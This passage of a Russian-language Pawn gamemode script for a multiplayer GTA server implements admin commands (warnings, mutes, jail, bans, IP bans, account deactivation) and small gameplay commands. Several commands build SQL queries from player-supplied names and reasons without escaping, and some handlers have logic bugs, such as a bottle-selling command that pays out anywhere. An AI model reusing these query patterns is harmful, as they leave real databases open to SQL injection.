	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!PI[params[0]][pAdmin]) return SendClientMessage(playerid, -1, "Выбранный Вами администратор не является лидером");
	else if(!PI[params[0]][pAWarn]) return SendClientMessage(playerid, -1, "Выбранный Вами администратор не имеет выговоров");
	PI[params[0]][pAWarn] --;
	MysqlUpdatePlayerInt(params[0], "awarn", PI[params[0]][pAWarn]);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Руководитель %s снял выговор с администратора %s [%d/3]", GetName(playerid), GetName(params[0]), PI[params[0]][pAWarn]);
	SendAdminMessageToAll(COLOR_RED, STRING_GLOBAL, params[0]);
	return true;
}

CMD:lunwarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 5) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /lunwarn [id игрока]");
	else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!PI[params[0]][pLeader]) return SendClientMessage(playerid, -1, "Выбранный Вами лидер не является лидером");
	else if(!PI[params[0]][pLWarn]) return SendClientMessage(playerid, -1, "Выбранный Вами лидер не имеет выговоров");
	PI[params[0]][pLWarn] --;
	MysqlUpdatePlayerInt(params[0], "lwarn", PI[params[0]][pLWarn]);

    STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Администратор %s снял выговор с лидера %s [%d/3]", GetName(playerid), GetName(params[0]), PI[params[0]][pLWarn]);
	SendAdminMessageToAll(COLOR_RED, STRING_GLOBAL, params[0]);
	return true;
}

CMD:activate(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");

	if(PI[playerid][pAdmin] < 6) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "s[24]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /activate [ник игрока]");

	STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE `name`='%s' AND `deactivate` = '1'", params[0]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "ActivateAccount", "is", playerid, params[0]);

	return true;
}

CMD:deactivate(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 6) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "s[24]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /deactivate [ник игрока]");

	if(GetPlayerID(params[0]) != INVALID_PLAYER_ID)
	{
	    new string[128], string1[128];
		PI[GetPlayerID(params[0])][pDeActivate] = 1;
		MysqlUpdatePlayerInt(GetPlayerID(params[0]), "deactivate", PI[GetPlayerID(params[0])][pDeActivate]);

		format(string1, sizeof string1, "Ваш аккаунт был деактивирован администратором %s(%d) для проведения расследования", GetName(playerid), playerid);
		SendClientMessage(GetPlayerID(params[0]), COLOR_RED, string1);
		SendClientMessage(GetPlayerID(params[0]), COLOR_RED, "Если Вы считаете, что произошла ошибка, сообщите об этом администрации сервера");

		format(string, sizeof string, "[A] Администратор %s деактивировал аккаунт игрока %s для проведения расследования", GetName(playerid), GetName(GetPlayerID(params[0])));
		SendAdminMessage(COLOR_GREY, string);

		Kick(GetPlayerID(params[0]));
	}
	else
	{

	    new string1[128];

		mysql_format(dbHandle, string1, sizeof(string1), "UPDATE "T_ACCOUNTS" SET `deactivate` = '1' WHERE `name` = '%s'", params[0]);
		mysql_tquery(dbHandle, string1, "", "");

		new string[128];

		format(string, sizeof string, "[A] Администратор %s OFFLINE деактивировал аккаунт игрока %s", GetName(playerid), params[0]);
		SendAdminMessage(COLOR_GREY, string);

	}


	return true;
}

CMD:offlwarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 5) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "s[24]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /offlwarn [ник игрока]");
	else if(GetPlayerID(params[0]) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Игрок в сети, используйте команду /lwarn");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, 128, "SELECT * FROM "T_ACCOUNTS" WHERE `name`='%s' LIMIT 1", params[0]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "OffWarnLeader", "iss", playerid, params[0], params[1]);
	return true;

}

CMD:offawarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 5) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "s[24]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /offawarn [ник игрока]");
	else if(GetPlayerID(params[0]) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Игрок в сети, используйте команду /awarn");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, 128, "SELECT * FROM "T_ACCOUNTS" WHERE `name`='%s' LIMIT 1", params[0]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "OffWarnAdmin", "iss", playerid, params[0], params[1]);
	return true;

}

CMD:offlunwarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 5) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "s[24]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /offlunwarn [ник игрока]");
	else if(GetPlayerID(params[0]) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Игрок в сети, используйте команду /lunwarn");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, 128, "SELECT * FROM "T_ACCOUNTS" WHERE `name`='%s' AND `leader` > '0'", params[0]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "OffUNWarnLeader", "is", playerid, params[0]);
	return true;

}

CMD:offaunwarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 5) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "s[24]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /offaunwarn [ник игрока]");
	else if(GetPlayerID(params[0]) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Игрок в сети, используйте команду /aunwarn");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, 128, "SELECT * FROM "T_ACCOUNTS" WHERE `name`='%s' AND `admin` > '0'", params[0]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "OffUNWarnAdmin", "is", playerid, params[0]);
	return true;

}


CMD:lwarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "us[24]", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /lwarn [id игрока] [причина]");
	else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!PI[params[0]][pLeader]) return SendClientMessage(playerid, -1, "Выбранный Вами игрок не является лидером");
    new string[128], string1[128];
	PI[params[0]][pLWarn] ++;
	MysqlUpdatePlayerInt(params[0], "lwarn", PI[params[0]][pLWarn]);
	if(PI[params[0]][pLWarn] < 3) format(string, sizeof(string), "Администратор %s выдал выговор лидеру %s [%i/3]. Причина: %s", GetName(playerid), GetName(params[0]), PI[params[0]][pLWarn], params[1]);
	else
	{
	    PI[params[0]][pLWarn] = 0;
		MysqlUpdatePlayerInt(params[0], "lwarn", PI[params[0]][pLWarn]);
	    LeaveFractionPlayer(params[0]);
		format(string, sizeof(string), "Лидер %s(%d) получил 3 выговора и был снят администратором %s(%d)", GetName(params[0]), params[0], GetName(playerid), playerid);
	}
	SendAdminMessageToAll(COLOR_RED, string, params[0]);

	format(string1, sizeof string1, "Вы получили выговор от администратора %s(%d). При 3-х имеющихся выговоров, Вы будете сняты с поста", GetName(playerid), playerid);
	SendClientMessage(params[0], COLOR_GREEN, string1);

	SendClientMessage(params[0], COLOR_GREEN, "Если Вы считаете, что произошла ошибка, обратитесь к основателям сервера");
	return true;
}
CMD:awarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "us[24]", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /awarn [id игрока] [причина]");
	else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!PI[params[0]][pAdmin]) return SendClientMessage(playerid, -1, "Выбранный Вами игрок не является администратором");
    new string[128], string1[128];
	PI[params[0]][pAWarn] ++;
	MysqlUpdatePlayerInt(params[0], "awarn", PI[params[0]][pAWarn]);
	if(PI[params[0]][pAWarn] < 3) format(string, sizeof(string), "Руководитель %s выдал выговор администратору %s [%i/3]. Причина: %s", GetName(playerid), GetName(params[0]), PI[params[0]][pAWarn], params[1]);
	else
	{
	    PI[params[0]][pAWarn] = 0;
		MysqlUpdatePlayerInt(params[0], "awarn", PI[params[0]][pAWarn]);
	    RemoveAdmin(params[0], GetName(params[0]));
		format(string, sizeof(string), "Администратор %s(%d) получил 3 выговора и был снят руководителем %s(%d)", GetName(params[0]), params[0], GetName(playerid), playerid);
	}
	SendAdminMessageToAll(COLOR_RED, string, params[0]);
	format(string1, sizeof string1, "Вы получили выговор от руководителя %s(%d). При 3-х имеющихся выговоров, Вы будете сняты с поста!", GetName(playerid), playerid);
	SendClientMessage(params[0], COLOR_GREEN, string1);
	SendClientMessage(params[0], COLOR_GREEN, "Если Вы считаете, что произошла ошибка, обратитесь к основателям сервера");
	return true;
}

CMD:warn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "us[24]", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /warn [id игрока] [причина]");
	else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
    else if(PI[playerid][pAdmin] <= PI[params[0]][pAdmin]) return AttemptRemoveAdmin(playerid);
	else if(IsIpFound(params[1]) || CheckString(params[1]) && !IsPlayerDeveloperAdmin(playerid)) return AdminAntisliv(playerid, params[1]);
	PI[params[0]][pWarn]++;
	MysqlUpdatePlayerInt(params[0], "warn", PI[params[0]][pWarn]);
	new string[128];
	if(PI[params[0]][pWarn] < 3) format(string, sizeof(string), "Администратор %s выдал предупреждение игроку %s [%i/3]. Причина: %s", GetName(playerid), GetName(params[0]), PI[params[0]][pWarn], params[1]);
	else
	{
	    new data[15], unbandate;
		PI[params[0]][pWarn] = 0;
		MysqlUpdatePlayerInt(params[0], "warn", PI[params[0]][pWarn]);
		format(string, sizeof(string), "Администратор %s забанил игрока %s (3 предупреждения). Причина: %s", GetName(playerid), GetName(params[0]), params[1]);
		getdate(years, months, days);
		unbandate = gettime() + 7*86400;
		format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', '%s', '%s', '%s', 7, %d, '%s')", GetName(params[0]), GetName(playerid), PI[params[0]][pIP], data, unbandate, params[1]);
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	SendAdminMessageToAll(COLOR_RED, string, params[0]);
	admin_attempt[playerid] ++ ;
	if(!GetPVarInt(playerid, "CHECKTIME")) admin_check_time[playerid] = gettime() + 20, SetPVarInt(playerid, "CHECKTIME", 1);
	if(admin_attempt[playerid] >= 3 && admin_check_time[playerid] > gettime())
	{
	    new ban_str[128];
		format(ban_str, sizeof ban_str, "Внимание! Администратору %s были заблокированы действия на сервере по подозрению во взломе.", GetName(playerid));
		SendClientMessageToAll(0xFE0000AA, ban_str);
		SendClientMessageToAll(0xFE0000AA, "Сообщите об этом основателю, так как возможен взлом!");
	    admin_ban_time[playerid] = 600;
		MysqlUpdatePlayerInt(playerid, "ban_time", admin_ban_time[playerid]);
	    admin_attempt[playerid] = 0;
	    admin_check_time[playerid] = 0;
		SendClientMessage(playerid, COLOR_RED, "Ваши действия были заблокированы по подозрению в сливе, администрация оповещена");
		return true;
	}
	LeaveFractionPlayer(params[0]);
	PI[params[0]][pSpawnChange] = 0;
	MysqlUpdatePlayerInt(params[0], "spawnchange", PI[params[0]][pSpawnChange]);
	Kick(params[0]);

	mysql_format(dbHandle, string, sizeof string, "UPDATE "T_ADMIN" SET `warns` = warns+1 WHERE `name` = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, string, "", "");
	return 1;
}

CMD:unwarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /unwarn [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[params[0]][pWarn] == 0) return SendClientMessage(playerid, COLOR_GREY, "У данного игрока нет предупреждений!");
	PI[params[0]][pWarn]--;
	MysqlUpdatePlayerInt(params[0], "warn", PI[params[0]][pWarn]);
	new string[128];
	format(string, sizeof(string), "Администратор %s[%d] снял Вам 1 предупреждение", GetName(playerid), playerid);
	SendClientMessage(params[0], COLOR_WHITE, string);
	format(string, sizeof(string), "[A] %s[%d] снял 1 предупреждение игроку %s[%d]", GetName(playerid), playerid, GetName(params[0]), params[0]);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:unban(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /unban [имя игрока]");

	STRING_GLOBAL[0]= EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM bans WHERE name = '%s'", params[0]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerUnban", "is", playerid, params[0]);
	return 1;
}

CMD:banip(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return 1;
//	if(!IsPlayerGrandAdmin(playerid)) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /banip [ip адрес]");
	new string[100];
	format(string, sizeof(string), "[A] %s заблокировал IP адрес %s", GetName(playerid), params);
	SendAdminMessageEx(COLOR_GREY, string, 4);
	format(string, sizeof(string), "banip %s", params);
	SendRconCommand(string);
	return 1;
}

CMD:unbanip(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return 1;
//	if(!IsPlayerGrandAdmin(playerid)) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /unbanip [ip адрес]");
	new string[100];
	format(string, sizeof(string), "[A] %s разблокировал IP адрес %s", GetName(playerid), params);
	SendAdminMessageEx(COLOR_GREY, string, 4);
	format(string, sizeof(string), "unbanip %s", params);
	SendRconCommand(string);
	return 1;
}

CMD:engine(playerid)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 0;
	new vehicleid = GetPlayerVehicleID(playerid);
	if(!IsAPlane(vehicleid)) return 0;
	GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehicleid,(GetVehicleData(vehicleid, veh_engine))?(false):(true),lights,alarm,doors,bonnet,boot,objective);
	SetVehicleData(vehicleid, veh_engine, GetVehicleData(vehicleid, veh_engine)?(false):(true));
	return 1;
}

CMD:cm(playerid)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 0;
	new vehicleid = GetPlayerVehicleID(playerid);
	if(IsAPlane(vehicleid)==1 || IsABoat(vehicleid)==1 || IsAMoped(vehicleid)==1 || IsAVel(vehicleid)==1) return 1;
	ShowPlayerDialog(playerid, 4814, DIALOG_STYLE_LIST, "Панель машины", "1. Капот\n2. Багажник\n3. Сигнализация", "Выбор", "Отмена");
	return 1;
}

CMD:sellbottle(playerid)
{
	STRING_GLOBAL[0] = EOS;
	new inter = GetPlayerInterior(playerid);
 	if (PlayerToPoint(10, playerid,1839.6327,2043.9260,16.0600))
   	if( inter == 10 || inter == 0)
    bottlemoney = PI[playerid][pBottles]*30;
    GiveMoney(playerid, bottlemoney);
    PI[playerid][pBottles] = 0;
    format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"{80FFFF}Вы получили: {FFFFFF}%d вирт", bottlemoney);
    SendClientMessage(playerid,COLOR_GREEN,STRING_GLOBAL);
	return 1;
 }

CMD:sbottles(playerid, params[])
{
	if(pocket[0][playerid] != 1) return SendClientMessage(playerid, COLOR_GREY, "- У Вас нет пакета.");
	SendClientMessage(playerid, COLOR_BLUE, "- Вы начали искать бутылки...");
	SetTimer("TBottles", 2000, 1);
 	return 1;
}
CMD:tbottles(playerid, params[0])
{
	STRING_GLOBAL[0] = EOS;
    if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_BLUE, "- Используйте: {BFBFBF}/tbottles [ID]");
	if(params[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "- Игрок не найден.");
    if(params[0] == INVALID_PLAYER_ID) return 1;
	if(bottles[playerid] == 0) return SendClientMessage(playerid, COLOR_GREY, "- У Вас нет бутылок.");
	if(pocket[0][params[0]] != 1) return SendClientMessage(playerid, COLOR_GREY, "- У игрока нет пакета.");
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "- Вы передали %s %d бутылок.", GetName(playerid), bottles[playerid]);
 	SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "- %s передал Вам бутылки.", GetName(playerid));
	SendClientMessage(params[0], COLOR_BLUE, STRING_GLOBAL);
	bottles[params[0]] = bottles[playerid];
	bottles[playerid] = 0;
	return 1;
}

CMD:hgps(playerid)
{
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете домом!");
	for(new i = TOTALHOUSE; i > 0; i --)
	{
		if(strcmp(GetName(playerid),HouseInfo[i][hOwner], true) == 0)
		{
			SetPlayerRaceCheckpoint(playerid,1, HouseInfo[i][hEntrx],HouseInfo[i][hEntry],HouseInfo[i][hEntrz],0.0,0.0,0.0, 4.0);
			SendClientMessage(playerid, COLOR_WHITE, "Ваш дом обозначен на карте {FF0000}красной меткой");
			SetPVarInt(playerid, "Home", 1);
		}
	}
	return 1;
}

CMD:unmute(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /unmute [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[params[0]][pMuted] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не имеет бан чата!");
	PI[params[0]][pMuted] = 0;
	MysqlUpdatePlayerInt(params[0], "mute", PI[params[0]][pMuted]);
	new string[100];
	format(string, sizeof(string), "Администратор %s снял бан чата у %s",GetName(playerid),GetName(params[0]));
	SendAdminMessageToAll(COLOR_RED, string, params[0]);
	return 1;
}

CMD:mute(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "udS()[64]", params[0], params[1], params[2])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /mute [id игрока] [время] [причина]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[params[0]][pMuted] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже имеет бан чата!");
	else if(params[1] > 300 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Время от 1 до 300 минут!");
	else if(IsIpFound(params[2]) || CheckString(params[2]) && !IsPlayerDeveloperAdmin(playerid)) return AdminAntisliv(playerid, params[2]);
	PI[params[0]][pMuted] = params[1]*60;
	MysqlUpdatePlayerInt(params[0], "mute", PI[params[0]][pMuted]);
	new string[144];
	if(strlen(params[2])) format(string, sizeof(string), "Администратор %s выдал бан чата %s на %d минут. Причина: %s",GetName(playerid), GetName(params[0]), params[1], params[2]);
	else format(string, sizeof(string), "Администратор %s выдал бан чата %s на %d минут.",GetName(playerid), GetName(params[0]), params[1]);
	SendAdminMessageToAll(COLOR_RED, string, params[0]);

	mysql_format(dbHandle, string, sizeof string, "UPDATE "T_ADMIN" SET `mutes` = mutes+1 WHERE `name` = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, string, "", "");

	admin_attempt[playerid] ++ ;
	if(!GetPVarInt(playerid, "CHECKTIME")) admin_check_time[playerid] = gettime() + 20, SetPVarInt(playerid, "CHECKTIME", 1);
	if(admin_attempt[playerid] >= 3 && admin_check_time[playerid] > gettime())
	{
	    new ban_str[128];
		format(ban_str, sizeof ban_str, "Внимание! Администратору %s были заблокированы действия на сервере по подозрению во взломе.", GetName(playerid));
		SendClientMessageToAll(0xFE0000AA, ban_str);
		SendClientMessageToAll(0xFE0000AA, "Сообщите об этом основателю, так как возможен взлом!");
	    admin_ban_time[playerid] = 600;
		MysqlUpdatePlayerInt(playerid, "ban_time", admin_ban_time[playerid]);
	    admin_attempt[playerid] = 0;
	    admin_check_time[playerid] = 0;
		SendClientMessage(playerid, COLOR_RED, "Ваши действия были заблокированы по подозрению в сливе, администрация оповещена");
		return true;
	}
	return 1;
}

CMD:jail(playerid, params[])
{
	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, ""cER"Ваши админ-действия на сервере заблокированы");
	else if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "iis[64]", params[0], params[1],  params[2])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /jail [id игрока] [время в минутах] [причина]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PI[params[0]][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже находиться в деморгане!");
	else if(params[1] < 1 || params[1] > 180) return SendClientMessage(playerid, COLOR_GREY, "Количество минут от 1 до 180!");
	else if(IsIpFound(params[2]) || CheckString(params[2])) return AdminAntisliv(playerid, params[2]);
	ResetPlayerWeapons(params[0]);
	PI[params[0]][pJailTime] = params[1] * 60;
	if(pCuff[params[0]][pCuffer] != INVALID_PLAYER_ID)
	{
		new cuffer = pCuff[params[0]][pCuffer];
		SetPlayerSpecialAction(params[0], SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(params[0], 0);
		pCuff[params[0]][pCuffer] = INVALID_PLAYER_ID;
		pCuff[params[0]][pCuffee] = INVALID_PLAYER_ID;
		pCuff[cuffer][pCuffee] = INVALID_PLAYER_ID;
		pCuff[cuffer][pCuffer] = INVALID_PLAYER_ID;
	}
	SetPlayerVirtualWorld(params[0], 3);
	new string[128];
	format(string, sizeof(string), "Администратор %s посадил Вас в тюрьму на %d мин. Причина: %s", GetName(playerid),params[1], params[2]);
	SendClientMessage(params[0], COLOR_GREEN, string);
	format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%d MIN", params[1]);
	GameTextForPlayer(params[0], string, 3000, 3);
	format(string, sizeof(string), "[A] %s[%i] посадил %s[%i] в тюрьму на %i минут (%s)", GetName(playerid), playerid, GetName(params[0]), params[0], params[1], params[2]);
	SendAdminMessage(COLOR_GREY, string);
	format(string, sizeof(string), "Администратор %s посадил в тюрьму %s на %d минут. Причина: %s",GetName(playerid),GetName(params[0]), params[1], params[2]);
	SendClientMessageToAll(COLOR_LIGHTRED, string);
	SetPlayerInterior(params[0], 0);
	SetPlayerWantedLevel(params[0], 0);
	PI[params[0]][pJail] = 1;

	new idx = random(sizeof coord_spawn_demorgan);
	SetPlayerPos(params[0], coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
	SetPlayerFacingAngle(params[0], coord_spawn_demorgan[idx][3]);

	return 1;
}

CMD:unjail(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /unjail [id игрока]");
